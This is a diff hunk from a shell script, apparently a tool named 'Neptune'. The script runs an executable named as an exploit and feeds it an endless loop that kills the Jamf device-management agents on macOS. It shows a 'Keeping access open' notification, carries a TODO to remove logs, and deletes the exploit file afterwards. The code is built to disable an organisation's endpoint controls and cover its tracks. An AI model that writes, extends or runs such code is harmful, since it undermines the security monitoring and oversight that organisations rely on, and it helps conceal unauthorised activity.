@@ -26,8 +26,10 @@ chmod +x "$exploit"
 echo "Doing work."
 osascript -e 'display notification "Keeping access open. Force quit when done." with title "Neptune" sound name ""'
 "$exploit" <<'EOF'
-(for ((;;)); do killall jamf jamfAgent; done) &
+for ((;;)); do
+    killall jamf jamfAgent 2>/dev/null
+done
 # TODO: Remove logs
 EOF
-
+wait
 rm "$exploit"
